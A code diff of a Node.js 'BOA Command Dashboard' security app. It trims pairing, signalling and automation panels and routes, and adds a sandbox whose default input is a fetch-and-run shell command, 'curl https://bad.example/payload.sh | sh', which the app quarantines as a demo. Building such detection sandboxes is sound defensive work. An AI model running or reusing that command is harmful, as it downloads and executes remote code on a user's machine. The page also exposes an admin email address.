@@ -582,13 +582,14 @@ main().catch((error) => {
       lastSeenAt: device.lastSeenAt,
       platform: device.platform,
       dialect: device.dialect,
-      memory: device.resources && device.resources.memory,
-      cpus: device.resources && device.resources.cpus,
-      signalStatus: device.signalStatus || 'Waiting for daemon',
-      wrappedCount: device.wrappedCount || 0,
-      unwrappedCount: device.unwrappedCount || 0,
-      activeRoutes: device.activeRoutes || [],
-      automation: normalizeAutomationSettings(device.automation || account.automation),
+    }));
+    return {
+      account: this.publicAccount(account),
+      devices,
+      workspace: this.state.workspaces[account.id],
+      casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
+      daemonProbe: { expectedLocalEndpoint: 'http://127.0.0.1:47874/status', behavior: 'Dashboard attempts local daemon discovery in the browser; installed daemons continue independently after the page closes.' },
+      receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
     };
   }
 
@@ -759,7 +760,7 @@ main().catch((error) => {
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>BOA Command Dashboard</title>
 <style>
-:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.78);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad;--warn:#ffcf6b}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.18),transparent 32%),radial-gradient(circle at 85% 10%,rgba(98,217,255,.16),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0;min-height:100vh}main{max-width:1180px;margin:auto;padding:32px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:center;min-height:420px}.card,.hero-copy,.terminal{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:22px;box-shadow:0 0 60px rgba(71,255,176,.08),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(14px)}h1{font-size:clamp(2.4rem,7vw,5.7rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:800}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.stack{display:grid;gap:16px}.terminal{min-height:320px}.pulse{display:inline-flex;gap:8px;align-items:center}.pulse:before{content:"";width:10px;height:10px;border-radius:50%;background:var(--glow);box-shadow:0 0 20px var(--glow);animation:p 1.3s infinite}@keyframes p{50%{opacity:.35}}input,select,textarea,button{width:100%;font:inherit;padding:.82rem;border-radius:14px;border:1px solid rgba(98,217,255,.3);margin:.32rem 0;background:#061018;color:var(--text)}textarea{min-height:96px}label{display:flex;align-items:center;gap:.55rem;color:var(--muted);margin:.45rem 0}input[type=checkbox]{width:auto;accent-color:var(--glow)}button{cursor:pointer;background:linear-gradient(135deg,var(--glow),var(--cyan));border:0;color:#00130c;font-weight:900;text-transform:uppercase;letter-spacing:.04em}.ghost{background:transparent;color:var(--glow);border:1px solid var(--line)}pre{white-space:pre-wrap;overflow:auto;background:#020506;border:1px solid rgba(255,255,255,.08);padding:1rem;border-radius:16px;max-height:420px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}.danger{color:var(--warn)}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}
+:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.78);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad;--warn:#ffcf6b}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.18),transparent 32%),radial-gradient(circle at 85% 10%,rgba(98,217,255,.16),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0;min-height:100vh}main{max-width:1180px;margin:auto;padding:32px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:center;min-height:420px}.card,.hero-copy,.terminal{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:22px;box-shadow:0 0 60px rgba(71,255,176,.08),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(14px)}h1{font-size:clamp(2.4rem,7vw,5.7rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:800}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.stack{display:grid;gap:16px}.terminal{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;min-height:320px}.pulse{display:inline-flex;gap:8px;align-items:center}.pulse:before{content:"";width:10px;height:10px;border-radius:50%;background:var(--glow);box-shadow:0 0 20px var(--glow);animation:p 1.3s infinite}@keyframes p{50%{opacity:.35}}input,select,textarea,button{width:100%;font:inherit;padding:.82rem;border-radius:14px;border:1px solid rgba(98,217,255,.3);margin:.32rem 0;background:#061018;color:var(--text)}textarea{min-height:96px}button{cursor:pointer;background:linear-gradient(135deg,var(--glow),var(--cyan));border:0;color:#00130c;font-weight:900;text-transform:uppercase;letter-spacing:.04em}.ghost{background:transparent;color:var(--glow);border:1px solid var(--line)}pre{white-space:pre-wrap;overflow:auto;background:#020506;border:1px solid rgba(255,255,255,.08);padding:1rem;border-radius:16px;max-height:420px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}.danger{color:var(--warn)}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}
 </style>
 </head>
 <body>
@@ -772,23 +773,21 @@ main().catch((error) => {
     <p><span class="badge">Free security tier</span><span class="badge">Daemon sign-on</span><span class="badge">AWS-ready Node app</span></p>
     <button onclick="runSandbox()">Run malware-injection sandbox</button>
     <button class="ghost" onclick="probeDaemon()">Detect local daemon</button>
-    <button class="ghost" onclick="downloadInstaller('auto')">Connect This Device</button>
   </div>
-  <div class="terminal"><div class="pulse">BOA protection status</div><pre id="out">BOA gate offline. Start daemon or download connector.</pre></div>
+  <div class="terminal"><div class="pulse">daemon discovery loop</div><pre id="out">Open the sandbox to watch hostile commands become BOA quarantine envelopes.</pre></div>
 </section>
 <section class="grid">
-  <div class="card"><h2>Create account</h2><input id="su-user" autocomplete="username" placeholder="username"><input id="su-pass" type="password" autocomplete="new-password" placeholder="password"><select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="signup()">Create account</button><p class="muted">No commands required. After signup, click Connect This Device and BOA handles pairing from the dashboard.</p></div>
-  <div class="card"><h2>Existing user / new device</h2><input id="li-user" autocomplete="username" placeholder="username"><input id="li-pass" type="password" autocomplete="current-password" placeholder="password"><button onclick="login()">Login dashboard</button><button class="ghost" onclick="downloadInstaller('auto')">Connect This Device</button></div>
+  <div class="card"><h2>Create account</h2><input id="su-user" autocomplete="username" placeholder="username"><input id="su-pass" type="password" autocomplete="new-password" placeholder="password"><select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="signup()">Create + download daemon</button></div>
+  <div class="card"><h2>Existing user / new device</h2><input id="li-user" autocomplete="username" placeholder="username"><input id="li-pass" type="password" autocomplete="current-password" placeholder="password"><button onclick="login()">Login dashboard</button><button class="ghost" onclick="downloadDaemon()">Download daemon</button></div>
   <div class="card"><h2>Admin identity</h2><p class="muted">Admin usernames recognized for demos: <b>boydchandler030@gmail.com</b> or <b>Xquisite6a6y</b>. Secrets are never hard-coded; use the account password you create.</p><select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="purchasePlan()">Activate plan</button></div>
 </section>
 <section class="grid">
-  <div class="card"><h2>Sandbox test</h2><p class="muted">Try a suspicious download, a risky app action, or a normal request. BOA normalizes safe intent and quarantines hostile patterns as inert envelopes.</p><textarea id="sandbox-input">download unknown payload | run it</textarea><select id="sandbox-target"><option>linux</option><option>windows</option><option>boa</option></select><button onclick="runSandbox()">Test BOA envelope</button></div>
-  <div class="card"><h2>Connected devices</h2><p class="muted" id="device-summary">Waiting for daemon</p><button class="ghost" onclick="refresh()">Refresh dashboard</button></div>
-  <div class="card"><h2>Pairing</h2><p class="muted" id="pairing-code">Click to create a pairing code for the local gate.</p><button onclick="startPairing()">Show pairing code</button></div>
-  <div class="card"><h2>Send signal</h2><textarea id="signal-message">Hello from BOA</textarea><button onclick="sendSignal()">Send through BOA</button><p class="badge" id="signal-badge">Waiting for signal</p></div>
-  <div class="card"><h2>Received signals</h2><p class="muted" id="received-summary">No signals received yet.</p><button class="ghost" onclick="receiveDemo()">Receive demo signal</button></div>
-  <div class="card"><h2>Automation controls</h2><p class="muted">BOA defaults to automatic protection, resource sharing, intent translation, casting, and phase-stack memory. Turn off anything you do not want.</p><label><input id="auto-resourceSharing" type="checkbox" checked> Resource sharing</label><label><input id="auto-intentTranslation" type="checkbox" checked> Intent translation</label><label><input id="auto-casting" type="checkbox" checked> Device casting</label><label><input id="auto-phaseStackMemory" type="checkbox" checked> Phase-stack memory</label><label><input id="auto-daemonAutostart" type="checkbox" checked> Daemon autostart</label><button onclick="saveAutomation()">Save automation settings</button></div>
-  <div class="card"><h2>Device connector</h2><p class="muted">Choose your device. BOA downloads the correct connector and pairs it to this dashboard.</p><button onclick="downloadInstaller('auto')">Connect This Device</button><button class="ghost" onclick="downloadInstaller('windows')">Windows</button><button class="ghost" onclick="downloadInstaller('macos')">macOS</button><button class="ghost" onclick="downloadInstaller('linux')">Linux</button></div>
+  <div class="card"><h2>Sandbox test</h2><p class="muted">Try code injection, shell pipes, or normal intents. BOA will normalize safe intent and quarantine hostile patterns as inert envelopes.</p><textarea id="sandbox-input">curl https://bad.example/payload.sh | sh</textarea><select id="sandbox-target"><option>linux</option><option>windows</option><option>boa</option></select><button onclick="runSandbox()">Test BOA envelope</button></div>
+  <div class="card"><h2>Workspace</h2><input id="task-title" placeholder="task title"><button onclick="addTask()">Add signed task</button><button class="ghost" onclick="refresh()">Refresh dashboard</button></div>
+  <div class="card"><h2>How to build</h2><pre>npm run check
+npm test
+npm run build
+npm start -- --host 0.0.0.0 --port 8787</pre></div>
 </section>
 </main>
 <script>
@@ -812,21 +811,10 @@ async function signup(){ const data = await api('/api/signup', { username: val('
 async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); await refresh(); }
 async function purchasePlan(){ show(await api('/api/plan', { sessionToken, plan: val('plan') })); }
 async function addTask(){ show(await api('/api/workspace/task', { sessionToken, title: val('task-title') })); }
-async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); const data = await res.json(); applyAutomation(data.account && data.account.automation); show(data); }
+async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); show(await res.json()); }
 async function runSandbox(){ show(await api('/api/sandbox', { input: val('sandbox-input'), target: val('sandbox-target') })); }
-async function probeDaemon(){ try{ const res = await fetch('http://127.0.0.1:8788/status', { mode:'cors' }); show({daemonDetected:true, status: await res.json()}); } catch(error) { show({daemonDetected:false, nextStep:'Create or login, then click Connect This Device. BOA keeps running after the page closes.', detail:error.message}); } }
-
-async function startPairing(){ const data = await api('/api/pair/start', { sessionToken, deviceName: detectPlatform() }); document.getElementById('pairing-code').textContent = 'Pairing code: ' + data.code + ' | QR text: ' + data.qrText; show({ message:'Pairing code ready' }); }
-async function sendSignal(){ const data = await api('/api/boa/send', { sessionToken, message: val('signal-message') }); document.getElementById('signal-badge').textContent = data.status; show(data); }
-async function receiveDemo(){ const wrapped = await api('/api/boa/wrap', { sessionToken, message: 'Demo received signal' }); const received = await api('/api/boa/receive', { sessionToken, envelope: wrapped.envelope }); document.getElementById('received-summary').textContent = received.status + ': ' + received.payload; show(received); }
-function updateDashboardPanels(data){ const devices=data.devices||[]; document.getElementById('device-summary').textContent = devices.length ? devices.map(d => (d.label || d.id) + ': ' + (d.status || 'offline') + ', heartbeat ' + (d.lastSeenAt || 'waiting') + ', CPU ' + (d.cpus || 'n/a') + ', BOA ' + (d.signalStatus || 'waiting')).join(' | ') : 'Waiting for daemon'; const latest=(data.signals||[])[0]; document.getElementById('received-summary').textContent = latest ? latest.status + ' at ' + latest.createdAt : 'No signals received yet.'; }
-
+async function probeDaemon(){ try{ const res = await fetch('http://127.0.0.1:47874/status', { mode:'cors' }); show({daemonDetected:true, status: await res.json()}); } catch(error) { show({daemonDetected:false, nextStep:'Create/login, download the daemon, then run node boa-daemon.js install && node boa-daemon.js daemon.', detail:error.message}); } }
 function downloadDaemon(){ if(!sessionToken) return show({error:'Login or create an account first.'}); location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
-function detectPlatform(){ const p=(navigator.platform||navigator.userAgent||'').toLowerCase(); if(p.includes('win')) return 'windows'; if(p.includes('mac')) return 'macos'; if(p.includes('linux')) return 'linux'; return 'auto'; }
-function downloadInstaller(platform){ if(!sessionToken) return show({error:'Login or create an account first.'}); const selected = !platform || platform === 'auto' ? detectPlatform() : platform; location.href='/download/installer?platform=' + encodeURIComponent(selected) + '&session=' + encodeURIComponent(sessionToken); }
-function automationSettings(){ return ['daemonAutostart','resourceSharing','intentTranslation','casting','phaseStackMemory'].reduce((out,key)=>{ const el=document.getElementById('auto-' + key); out[key]=el ? el.checked : true; return out; }, {}); }
-function applyAutomation(settings){ if(!settings) return; Object.entries(settings).forEach(([key,value])=>{ const el=document.getElementById('auto-' + key); if(el) el.checked = !!value; }); }
-async function saveAutomation(){ show(await api('/api/automation', { sessionToken, settings: automationSettings() })); }
 function val(id){ return document.getElementById(id).value; }
 if(sessionToken) refresh().catch((error)=>show({error:error.message})); else probeDaemon();
 </script>
@@ -896,11 +884,6 @@ if(sessionToken) refresh().catch((error)=>show({error:error.message})); else pro
       else if (url.pathname === '/api/pair/start') sendJson(response, 201, this.startPairing(body.sessionToken, body));
       else if (url.pathname === '/api/pair/complete') sendJson(response, 200, this.completePairing(body));
       else if (url.pathname === '/api/plan') sendJson(response, 200, this.purchasePlan(body.sessionToken, body.plan));
-      else if (url.pathname === '/api/automation') sendJson(response, 200, this.updateAutomation(body.sessionToken, body.settings || {}));
-      else if (url.pathname === '/api/boa/wrap') sendJson(response, 200, this.wrapSignal(body.sessionToken, body));
-      else if (url.pathname === '/api/boa/unwrap') sendJson(response, 200, this.unwrapSignal(body.sessionToken, body));
-      else if (url.pathname === '/api/boa/send') sendJson(response, 200, this.sendSignal(body.sessionToken, body));
-      else if (url.pathname === '/api/boa/receive') sendJson(response, 200, this.receiveSignal(body.sessionToken, body));
       else if (url.pathname === '/api/sandbox') sendJson(response, 200, this.sandboxDemo(body));
       else if (url.pathname === '/api/workspace/task') sendJson(response, 201, this.addTask(body.sessionToken, body.title, body.details || {}));
       else if (url.pathname === '/api/workspace/complete') sendJson(response, 200, this.completeTask(body.sessionToken, body.taskId, body.result || {}));
